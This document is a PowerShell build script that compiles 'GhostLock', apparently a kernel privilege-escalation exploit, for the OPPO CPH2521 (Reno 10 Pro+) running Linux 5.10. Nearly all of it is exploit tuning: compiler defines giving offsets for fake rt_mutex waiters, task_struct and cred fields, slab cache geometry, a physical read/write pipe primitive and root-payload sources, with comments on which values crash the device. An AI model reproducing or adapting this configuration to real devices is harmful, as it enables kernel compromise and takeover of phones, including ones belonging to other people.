# Build GhostLock for OPPO CPH2521 (Reno 10 Pro+) / kernel 5.10.236
#
# Geometry from THIS device's boot.img (not Quest / not 6.12 OnePlus):
#   mm_cache_init: kmem_cache_create(..., size=0x3c0, ...)
#   mm_alloc: memset(mm, 0, 0x3b0); field at +0x3b0 => sizeof ~0x3c0
#   SLUB packing for 0x3c0: order-2 = 17 objs / 16KB, waste 0.4% (best)
#   Waiter (task_blocks_on_rt_mutex): task+lock @0x30 (stp), prio@0x40, deadline@0x48
#   No kmalloc-cg-* strings => KMALLOC_CACHE_TYPES=3
#   KIMAGE _text = 0xffffffc008000000; phys load default 0xa8000000
#   file_operations: Android 5.10 + mmap_supported_flags (open@0x70) — see target.h
#   fops pointers: *.cfi_jt (CFI) — raw funcs cause errno 22 at CFI stage
#
$ErrorActionPreference = "Stop"
$Root = Split-Path -Parent $MyInvocation.MyCommand.Path

$NdkCandidates = @(
  "C:\Users\LENOVO\Downloads\android-ndk-r27d-windows\android-ndk-r27d",
  (Join-Path (Split-Path $Root -Parent) "android-ndk-r27c"),
  "C:\Users\LENOVO\Desktop\HILY installer\Oppo\android-ndk-r27c"
)
$Ndk = $NdkCandidates | Where-Object { Test-Path $_ } | Select-Object -First 1
if (-not $Ndk) { throw "No Android NDK found" }

$Cc = Join-Path $Ndk "toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android35-clang.cmd"
if (-not (Test-Path $Cc)) { throw "NDK clang not found: $Cc" }
Write-Host "NDK: $Ndk"

Set-Location $Root

$Defs = @(
  '-DTARGET_CONFIG_H=\"target.h\"',
  '-DGHOSTLOCK_KERNEL_5_10=1',
  # Measured on device: shift=0 softboots; shift=-2 survives pselect + CFI probe
  '-DPSELECT_WAITER_WORD_SHIFT=(0)',
  '-DKIMAGE_TEXT_BASE=0xffffffc008000000ULL',
  # CPH2521 mm_struct from mm_cache_init (NOT Quest 0x400)
  '-DMM_STRUCT_SZ=0x3c0',
  '-DMM_ORDER=2',
  '-DKSNITCH_COLLISIONS=8',
  # CyberMeowfia/IonStack Pixel uses -0xe80; prior CPH try used -0xe20.
  # Wrong delta => fake waiter/fops land off-page => soft reboot at pselect.
  '-DSKB_DATA_DELTA=(-0xe80LL)',
  '-DKERNELSNITCH_IDENTITY_END=0xffffff9000000000ULL',
  # 5.10 plain rt_mutex_waiter
  '-DWAITER_PI_TREE_ENTRY_OFF=0x18',
  '-DWAITER_TASK_OFF=0x30',
  '-DWAITER_LOCK_OFF=0x38',
  '-DWAITER_PRIO_OFF=0x40',
  '-DWAITER_DEADLINE_OFF=0x48',
  '-DFAKE_WAITER_PI_TREE_ENTRY_OFF=0x18',
  '-DFAKE_WAITER_TASK_OFF=0x30',
  '-DFAKE_WAITER_LOCK_OFF=0x38',
  '-DFAKE_WAITER_PI_TREE_PRIO_OFF=0x40',
  '-DFAKE_WAITER_PI_TREE_DEADLINE_OFF=0x48',
  # A155N / Android 5.10 task_struct.usage (was wrongly 0x38)
  '-DFAKE_TASK_USAGE_OFF=0x40',
  '-DSTRUCT_SLAB_CACHE_OFF=0x18',
  '-DCRED_UID_OFF=4',
  '-DCRED_SECUREBITS_OFF=0x24',
  '-DCRED_CAPS_OFF=0x28',
  '-DCRED_SECURITY_OFF=0x78',
  # no kmalloc-cg on this kernel image
  '-DKMALLOC_CACHE_TYPES=3',
  '-DKMALLOC_PIPE_INDEX=10',
  '-DKMALLOC_PIPE_OBJ_SIZE=0x400',
  '-DKMALLOC_CGROUP_TYPE=0'
)

$Srcs = @(
  'src/core/main.c','src/core/util.c','src/core/slide.c','src/core/fops.c',
  'src/core/pipe_physrw.c','src/core/root.c','src/core/miniadb.c','src/core/umh_root.c'
)

$Out = "ghostlock-cph2521"
if (Test-Path $Out) { Remove-Item $Out -Force }

$Args = @(
  '-O2','-Wall','-Wno-unused-parameter','-Wno-sign-compare','-Wno-unused-function',
  '-Isrc/core','-Isrc/devices'
) + $Defs + @('-fPIE','-pie','-pthread') + $Srcs + @('-o', $Out)

Write-Host "Building $Out ..."
Write-Host "  mm=0x3c0 order=2 (from boot.img mm_cache_init) waiter task@0x30"
& $Cc @Args
if ($LASTEXITCODE -ne 0) { throw "compile failed: $LASTEXITCODE" }
Write-Host "OK: $Out ($((Get-Item $Out).Length) bytes)"
